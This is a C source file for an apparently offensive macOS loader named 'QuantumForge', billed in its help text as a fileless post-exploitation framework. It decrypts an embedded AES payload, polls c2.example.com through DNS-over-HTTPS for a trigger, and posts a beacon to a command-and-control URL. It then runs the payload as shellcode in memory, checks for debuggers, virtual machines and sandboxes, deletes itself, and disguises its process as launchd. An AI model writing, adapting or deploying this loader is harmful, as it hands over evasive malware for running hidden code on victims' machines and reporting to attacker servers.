#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <pthread.h>
#include <CommonCrypto/CommonCryptor.h>
#include <CommonCrypto/CommonKeyDerivation.h>
#include <CommonCrypto/CommonHMAC.h>
#include <curl/curl.h>
#include "junk.h"  // Generated per build
#include "anti_analysis.h"  // Enhanced anti-analysis functions
#include "qf_logging.h"  // JSON logging system

static volatile sig_atomic_t shutdown_requested = 0;

static void secure_zero_memory(void *ptr, size_t len) {
    volatile unsigned char *p = ptr;
    while (len--) {
        *p++ = 0;
    }
}

static void signal_handler(int sig) {
    shutdown_requested = 1;
    qf_logger_close(128 + sig);
    _exit(128 + sig);
}

static void setup_signal_handlers(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = signal_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);
}

static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char* base64_encode(const unsigned char *data, size_t input_length, size_t *output_length) {
    *output_length = 4 * ((input_length + 2) / 3);
    char *encoded_data = malloc(*output_length + 1);
    if (!encoded_data) return NULL;

    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = base64_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 0 * 6) & 0x3F];
    }

    size_t mod_table[] = {0, 2, 1};
    for (size_t i = 0; i < mod_table[input_length % 3]; i++) {
        encoded_data[*output_length - 1 - i] = '=';
    }

    encoded_data[*output_length] = '\0';
    return encoded_data;
}

unsigned char encrypted_payload[] = "__ENCRYPTED_PAYLOAD__";
unsigned char fixed_salt[] = "__FIXED_SALT__";
unsigned char iv[] = "__IV__";
unsigned char base_key[] = "__BASE_KEY__";
size_t payload_len = sizeof(encrypted_payload);

typedef struct {
    int no_doh;
    int no_selfdelete;
    int fallback_only;
    int test_mode;
    int show_help;
    char *stage_file;
    char *doh_provider;
} config_t;

config_t config = {0, 0, 0, 0, 0, NULL, "https://dns.google/dns-query"};

// XOR key for in-memory encryption
unsigned char xor_key = 0xAA;

static int hkdf_extract(unsigned char *prk, size_t *prk_len,
                        const unsigned char *salt, size_t salt_len,
                        const unsigned char *ikm, size_t ikm_len) {
    unsigned char digest[CC_SHA256_DIGEST_LENGTH];
    CCHmac(kCCHmacAlgSHA256, salt, salt_len, ikm, ikm_len, digest);
    memcpy(prk, digest, CC_SHA256_DIGEST_LENGTH);
    *prk_len = CC_SHA256_DIGEST_LENGTH;
    return 0;
}

static int hkdf_expand(unsigned char *okm, size_t okm_len,
                       const unsigned char *prk, size_t prk_len,
                       const unsigned char *info, size_t info_len) {
    unsigned char prev[CC_SHA256_DIGEST_LENGTH];
    unsigned char counter = 1;
    size_t done = 0;
    
    while (done < okm_len) {
        unsigned char tmp[CC_SHA256_DIGEST_LENGTH + 256];
        size_t tmp_len = 0;
        
        if (counter > 1) {
            memcpy(tmp, prev, CC_SHA256_DIGEST_LENGTH);
            tmp_len = CC_SHA256_DIGEST_LENGTH;
        }
        if (info && info_len > 0) {
            memcpy(tmp + tmp_len, info, info_len);
            tmp_len += info_len;
        }
        tmp[tmp_len++] = counter;
        
        CCHmac(kCCHmacAlgSHA256, prk, prk_len, tmp, tmp_len, prev);
        
        size_t to_copy = okm_len - done;
        if (to_copy > CC_SHA256_DIGEST_LENGTH) {
            to_copy = CC_SHA256_DIGEST_LENGTH;
        }
        
        memcpy(okm + done, prev, to_copy);
        done += to_copy;
        counter++;
        
        if (counter > 255) {
            return -1;
        }
    }
    
    secure_zero_memory(prev, sizeof(prev));
    return 0;
}

int decrypt_payload(unsigned char *decrypted_payload) {
    unsigned char prk[CC_SHA256_DIGEST_LENGTH];
    size_t prk_len;
    unsigned char derived_key[32];
    
    if (hkdf_extract(prk, &prk_len, fixed_salt, sizeof(fixed_salt) - 1, 
                     base_key, sizeof(base_key) - 1) != 0) {
        secure_zero_memory(prk, sizeof(prk));
        secure_zero_memory(derived_key, sizeof(derived_key));
        return -1;
    }
    
    if (hkdf_expand(derived_key, sizeof(derived_key), prk, prk_len, NULL, 0) != 0) {
        secure_zero_memory(prk, sizeof(prk));
        secure_zero_memory(derived_key, sizeof(derived_key));
        return -1;
    }
    
    secure_zero_memory(prk, sizeof(prk));
    JUNK_ASM;

    size_t dataOutMoved;
    CCCryptorStatus status = CCCrypt(kCCDecrypt, kCCAlgorithmAES, kCCOptionPKCS7Padding, 
                                      derived_key, kCCKeySizeAES256, iv, 
                                      encrypted_payload, payload_len, 
                                      decrypted_payload, payload_len, &dataOutMoved);
    
    secure_zero_memory(derived_key, sizeof(derived_key));
    
    if (status != kCCSuccess) {
        return -1;
    }
    
    payload_len = dataOutMoved;
    return 0;
}

// XOR encrypt/decrypt in memory
void xor_memory(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// DNS-over-HTTPS C2 trigger
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t total = size * nmemb;
    char *ptr = malloc(total + 1);
    if (!ptr) return 0;
    memcpy(ptr, contents, total);
    ptr[total] = '\0';
    *(char **)userp = ptr;
    return total;
}

int doh_c2_trigger() {
    if (config.no_doh) return 0;
    CURL *curl = curl_easy_init();
    if (!curl) return -1;
    char *response = NULL;
    curl_easy_setopt(curl, CURLOPT_URL, "https://dns.google/resolve?name=c2.example.com&type=TXT");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    CURLcode res = curl_easy_perform(curl);
    int result = -1;
    if (res == CURLE_OK && response) {
        if (strstr(response, "\"C2_TRIGGER:1\"")) {
            result = 0;
        }
        free(response);
    }
    curl_easy_cleanup(curl);
    return result;
}

void send_beacon(unsigned char *shellcode, size_t shellcode_len) {
    CURL *curl = curl_easy_init();
    if (!curl) {
        QF_LOG_ERROR("beacon", "Failed to initialize curl", NULL);
        return;
    }

    size_t encoded_len;
    char *base64_shellcode = base64_encode(shellcode, shellcode_len, &encoded_len);
    if (!base64_shellcode) {
        curl_easy_cleanup(curl);
        QF_LOG_ERROR("beacon", "Base64 encoding failed", NULL);
        return;
    }

    char host_header[128];
    snprintf(host_header, sizeof(host_header), "Host: %s", "c2.example.com");

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, host_header);
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36");

    curl_easy_setopt(curl, CURLOPT_URL, "https://c2.example.com/beacon");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, base64_shellcode);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, encoded_len);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);

    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK) {
        QF_LOG_SUCCESS("beacon", "C2 beacon sent successfully", NULL);
    } else {
        QF_LOG_ERROR("beacon", "C2 beacon failed", curl_easy_strerror(res));
    }
    
    secure_zero_memory(base64_shellcode, encoded_len);
    free(base64_shellcode);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

// Execute payload (second-stage loader)
void exec_payload(unsigned char *decrypted_payload) {
    vm_address_t shellcode;
    mach_vm_allocate(mach_task_self(), &shellcode, payload_len, VM_FLAGS_ANYWHERE);
    memcpy((void *)shellcode, decrypted_payload, payload_len);
    mprotect((void *)shellcode, payload_len, PROT_READ | PROT_EXEC);
    ((void (*)())shellcode)();
}

// Anti-debug check
int is_debugged() {
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
    struct kinfo_proc info;
    size_t size = sizeof(info);
    sysctl(mib, 4, &info, &size, NULL, 0);
    return (info.kp_proc.p_flag & P_TRACED) != 0;
}

// Anti-VM check
int is_vm() {
    char vendor[13];
    unsigned int eax, ebx, ecx, edx;
    __asm__ __volatile__ ("cpuid" : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx) : "a"(0));
    memcpy(vendor, &ebx, 4);
    memcpy(vendor + 4, &edx, 4);
    memcpy(vendor + 8, &ecx, 4);
    vendor[12] = '\0';
    if (!strcmp(vendor, "VMwareVMware") || !strcmp(vendor, "KVMKVMKVM")) return 1;

    int cpu_count;
    size_t len = sizeof(cpu_count);
    sysctlbyname("hw.ncpu", &cpu_count, &len, NULL, 0);
    return cpu_count < 2;
}

// Anti-sandbox timing
int is_sandbox() {
    struct timespec req = {0, 1000000}; // 1ms
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    nanosleep(&req, NULL);
    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed = (end.tv_sec - start.tv_sec) * 1000.0 + (end.tv_nsec - start.tv_nsec) / 1000000.0;
    return elapsed < 0.5 || elapsed > 1.5;
}

void self_delete() {
    if (config.no_selfdelete) return;
    char path[1024];
    uint32_t size = sizeof(path);
    if (_NSGetExecutablePath(path, &size) == 0) {
        unlink(path);
    }
}

// Masquerade process
void spoof_process_name() {
    setprogname("launchd");
}

void print_help(const char *prog) {
    fprintf(stderr, "Usage: %s [OPTIONS]\n\n", prog);
    fprintf(stderr, "QuantumForge Loader - Fileless Post-Exploitation Framework\n\n");
    fprintf(stderr, "Options:\n");
    fprintf(stderr, "  --no-doh             Disable DNS-over-HTTPS C2 trigger\n");
    fprintf(stderr, "  --no-selfdelete      Prevent loader from unlinking itself\n");
    fprintf(stderr, "  --fallback-only      Offline mode (no remote retrieval)\n");
    fprintf(stderr, "  --test-mode          Enable debug output, simulate without execution\n");
    fprintf(stderr, "  --stage-file <path>  Supply local stage file for manual testing\n");
    fprintf(stderr, "  --doh-provider <url> Custom DoH resolver (default: dns.google)\n");
    fprintf(stderr, "  --help               Show this help message\n\n");
    fprintf(stderr, "Examples:\n");
    fprintf(stderr, "  %s --test-mode --no-doh\n", prog);
    fprintf(stderr, "  %s --fallback-only --stage-file payload.bin\n", prog);
    fprintf(stderr, "  %s --doh-provider https://cloudflare-dns.com/dns-query\n\n", prog);
}

int validate_config() {
    if (config.fallback_only && config.stage_file) {
        fprintf(stderr, "[!] Error: --fallback-only and --stage-file are mutually exclusive\n");
        return -1;
    }
    if (config.stage_file) {
        int fd = open(config.stage_file, O_RDONLY);
        if (fd < 0) {
            fprintf(stderr, "[!] Error: Cannot open stage file: %s\n", config.stage_file);
            return -1;
        }
        close(fd);
    }
    return 0;
}

void parse_flags(int argc, char **argv) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-doh") == 0) {
            config.no_doh = 1;
        } else if (strcmp(argv[i], "--no-selfdelete") == 0) {
            config.no_selfdelete = 1;
        } else if (strcmp(argv[i], "--fallback-only") == 0) {
            config.fallback_only = 1;
        } else if (strcmp(argv[i], "--test-mode") == 0) {
            config.test_mode = 1;
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            config.show_help = 1;
        } else if (strcmp(argv[i], "--stage-file") == 0) {
            if (i + 1 < argc) {
                config.stage_file = argv[++i];
            } else {
                fprintf(stderr, "[!] Error: --stage-file requires a path\n");
                return;
            }
        } else if (strcmp(argv[i], "--doh-provider") == 0) {
            if (i + 1 < argc) {
                config.doh_provider = argv[++i];
            } else {
                fprintf(stderr, "[!] Error: --doh-provider requires a URL\n");
                return;
            }
        } else {
            fprintf(stderr, "[!] Unknown option: %s\n", argv[i]);
            fprintf(stderr, "Use --help for usage information\n");
            return;
        }
    }
}

int main(int argc, char **argv) {
    setup_signal_handlers();
    parse_flags(argc, argv);
    
    if (config.show_help) {
        print_help(argv[0]);
        return 0;
    }
    
    if (validate_config() != 0) {
        return 1;
    }
    
    qf_logger_init("macos");
    QF_LOG_INFO("main", "QuantumForge macOS loader started", NULL);
    
    if (config.test_mode) {
        fprintf(stderr, "[*] Test mode enabled - simulation only\n");
        fprintf(stderr, "[*] Config: no_doh=%d, no_selfdelete=%d, fallback=%d\n",
                config.no_doh, config.no_selfdelete, config.fallback_only);
        QF_LOG_INFO("config", "Test mode enabled", "simulation_only");
    }
    
    spoof_process_name();
    
    if (!config.test_mode) {
        QF_LOG_INFO("anti_analysis", "Running anti-analysis checks", NULL);
        if (check_all_anti_analysis(0)) {
            QF_LOG_ERROR("anti_analysis", "Analysis environment detected, terminating", NULL);
            qf_logger_close(1);
            return 1;
        }
        QF_LOG_SUCCESS("anti_analysis", "No threats detected", NULL);
    } else {
        fprintf(stderr, "[*] Skipping anti-analysis checks (test mode)\n");
        QF_LOG_INFO("anti_analysis", "Skipped in test mode", NULL);
    }
    
    unsigned char *decrypted_payload = malloc(payload_len);
    if (!decrypted_payload) {
        QF_LOG_ERROR("memory", "Failed to allocate payload buffer", NULL);
        qf_logger_close(1);
        return 1;
    }
    
    if (config.test_mode) {
        memset(decrypted_payload, 0, payload_len);
        fprintf(stderr, "[*] Test mode: skipping decryption\n");
    } else {
        if (decrypt_payload(decrypted_payload) != 0) {
            QF_LOG_ERROR("crypto", "Payload decryption failed", NULL);
            secure_zero_memory(decrypted_payload, payload_len);
            free(decrypted_payload);
            qf_logger_close(1);
            return 1;
        }
        xor_memory(decrypted_payload, payload_len, xor_key);
        mprotect((void *)((uintptr_t)encrypted_payload & ~(getpagesize() - 1)), 
                 ((payload_len + getpagesize() - 1) & ~(getpagesize() - 1)), PROT_NONE);
    }
    
    if (config.test_mode) {
        fprintf(stderr, "[*] Payload decrypted successfully (size: %zu bytes)\n", payload_len);
        fprintf(stderr, "[*] Test mode: skipping execution\n");
        char size_buf[64];
        snprintf(size_buf, sizeof(size_buf), "%zu bytes", payload_len);
        QF_LOG_SUCCESS("decrypt", "Payload decrypted successfully", size_buf);
        QF_LOG_INFO("test_mode", "Skipping execution in test mode", NULL);
        const char *log_path = qf_logger_get_path();
        if (log_path) {
            fprintf(stderr, "[*] Log file: %s\n", log_path);
        }
        secure_zero_memory(decrypted_payload, payload_len);
        free(decrypted_payload);
        qf_logger_close(0);
        return 0;
    }
    
    QF_LOG_SUCCESS("decrypt", "Payload decrypted", NULL);
    
    if (doh_c2_trigger() == 0) {
        printf("[*] C2 trigger successful\n");
        QF_LOG_SUCCESS("c2", "DoH C2 trigger successful", NULL);
    }
    
    send_beacon(decrypted_payload, payload_len);
    QF_LOG_INFO("beacon", "Beacon sent", NULL);
    
    xor_memory(decrypted_payload, payload_len, xor_key);
    self_delete();
    QF_LOG_INFO("stealth", "Self-delete executed", NULL);
    
    if (!config.fallback_only) {
        QF_LOG_INFO("execution", "Loading Mach-O payload", "memory_resident");
        exec_payload(decrypted_payload);
    }
    
    secure_zero_memory(decrypted_payload, payload_len);
    free(decrypted_payload);
    qf_logger_close(0);
    return 0;
}
